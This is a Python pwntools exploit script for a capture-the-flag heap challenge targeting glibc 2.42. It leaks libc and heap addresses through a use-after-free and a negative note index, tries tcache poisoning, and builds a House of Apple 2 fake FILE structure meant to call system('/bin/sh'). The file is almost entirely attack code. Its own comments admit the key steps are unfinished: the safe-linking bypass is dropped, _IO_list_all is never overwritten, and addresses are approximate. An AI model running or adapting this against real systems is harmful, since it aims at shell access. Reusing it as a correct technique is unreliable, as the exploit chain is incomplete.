#!/usr/bin/env python3
"""
Crazy FSOP - House of Apple 2 Implementation for glibc 2.42
============================================================

House of Apple 2 exploits _IO_wfile_overflow behavior.

Requirements:
1. Fake FILE structure with controlled _wide_data
2. _flags must satisfy certain checks
3. vtable points to _IO_wfile_jumps
4. Trigger via exit() or other FILE flush

The fake _wide_data structure needs:
- _wide_data->_IO_write_base = 0
- _wide_data->_IO_write_ptr != 0
- _wide_data->_IO_buf_base = writable address
- This will call _wide_data->vtable->doallocate

Actually for House of Apple 2, we redirect call to system.
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.arch = 'amd64'
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('amt.rs', 26797)
    return process([elf.path])

def create(io, idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(io, idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(io, idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

def exploit():
    io = start()

    # ==== Step 1: Leak libc ====
    info("Step 1: Leak libc")

    create(io, 0, 0x500, b'A' * 8)
    create(io, 1, 0x20, b'B' * 8)
    delete(io, 0)

    leak = view(io, 0)
    libc_leak = u64(leak[:8])

    # Try different offsets for glibc 2.42
    # Unsorted bin in main_arena
    for offset in [0x21ace0, 0x21ace0 - 0x60, 0x21ace0 + 0x60, 0x203b60, 0x203b20]:
        test_base = libc_leak - offset
        if (test_base & 0xfff) == 0:
            libc.address = test_base
            break

    success(f"Libc leak: {hex(libc_leak)}")
    success(f"Libc base: {hex(libc.address)}")

    # Verify with GOT leak
    leak = view(io, -21)  # puts@got
    puts_addr = u64(leak[:6].ljust(8, b'\x00'))

    # Recalculate
    libc.address = puts_addr - libc.symbols['puts']
    success(f"Corrected libc base: {hex(libc.address)}")

    # ==== Step 2: Get addresses ====
    system = libc.symbols['system']
    binsh = next(libc.search(b'/bin/sh'))
    _IO_wfile_jumps = libc.address + 0x233228
    _IO_list_all = libc.address + libc.symbols['_IO_list_all']

    info(f"system: {hex(system)}")
    info(f"/bin/sh: {hex(binsh)}")
    info(f"_IO_wfile_jumps: {hex(_IO_wfile_jumps)}")
    info(f"_IO_list_all: {hex(_IO_list_all)}")

    # ==== Step 3: Leak heap ====
    info("Step 2: Leak heap")

    create(io, 2, 0x100, b'C' * 8)
    create(io, 3, 0x100, b'D' * 8)
    delete(io, 2)
    delete(io, 3)

    leak = view(io, 3)
    heap_leak = u64(leak[:8])

    # Safe-linking demangle
    heap_addr = heap_leak << 12

    info(f"Heap leak (mangled): {hex(heap_leak)}")
    info(f"Heap address: {hex(heap_addr)}")

    # ==== Step 4: Tcache poisoning ====
    info("Step 3: Tcache poisoning")

    # We have two 0x110 chunks in tcache: chunk2 and chunk3
    # chunk3->fd points to chunk2 (mangled)

    # We want to make chunk3->fd point to _IO_list_all
    # So next allocations will be: chunk3, _IO_list_all

    # But we need to overwrite chunk3's fd
    # We can use create() at index 3 (UAF)

    # Calculate mangled pointer for _IO_list_all
    # safe_linking mangle: fd = (next >> 12) ^ chunk_addr
    target = _IO_list_all - 0x10  # malloc returns ptr+0x10

    # For safe-linking to target:
    # We'd write: (target >> 12) ^ heap_addr_of_chunk3
    # But we don't know exact heap address

    # Alternative: Try without safe-linking bypass (might crash)
    # Or use partial overwrite

    # Let me try a simpler approach:
    # Use the negative index write to directly write to _IO_list_all

    # Can we reach _IO_list_all from notes array?
    # notes is in BSS around 0x4040
    # _IO_list_all is in libc at 0x2354c0
    # These are in different memory regions, so no direct access

    # We must use heap techniques to reach _IO_list_all

    # ==== Alternative: Overwrite stdout/stderr directly ====
    info("Step 4: Alternative - corrupt stderr")

    # stderr is at a fixed offset in libc
    stderr = libc.address + libc.symbols['_IO_2_1_stderr_']
    info(f"stderr: {hex(stderr)}")

    # If we can allocate a chunk at stderr and write our fake FILE there
    # Then when exit() is called, it will use our fake FILE

    # To do this via tcache poisoning with safe-linking:
    # 1. We need to know heap address precisely
    # 2. Calculate mangled fd
    # 3. Overwrite tcache bin

    # Since safe-linking is hard to bypass without exact heap address,
    # let's try a different technique

    # ==== Final approach: Use largebin or other technique ====
    # For now, let me create the fake FILE structure and see what happens

    info("Step 5: Create fake FILE structure")

    # House of Apple 2 fake FILE layout
    # We'll create this in a regular chunk first

    fake_wide_data_addr = heap_addr + 0x1000  # Approximate

    fake_wide_data = flat({
        0x18: 0,  # _IO_write_base
        0x20: 1,  # _IO_write_ptr
        0x30: binsh,  # _IO_buf_base (will be first arg to system)
        0x40: 0,  # _IO_buf_end
        0xe0: system,  # vtable->__doallocate pointer
    }, length=0x200, filler=b'\x00')

    fake_file = flat({
        0x00: 0,  # _flags
        0x20: 0,  # _IO_write_base
        0x28: 1,  # _IO_write_ptr
        0xa0: fake_wide_data_addr,  # _wide_data
        0xd8: _IO_wfile_jumps,  # vtable
    }, length=0x200, filler=b'\x00')

    # Create chunks with fake structures
    create(io, 4, 0x200, fake_file)
    create(io, 5, 0x200, fake_wide_data)

    info("Fake structures created")

    # Now we need to make _IO_list_all point to our fake FILE
    # This requires arbitrary write to libc

    # Since we can't easily get that, let's try triggering via abort()
    # or another method

    # Alternative: Use exit via sending invalid input
    info("Triggering exit...")

    io.sendline(b'invalid')

    io.interactive()

if __name__ == '__main__':
    exploit()
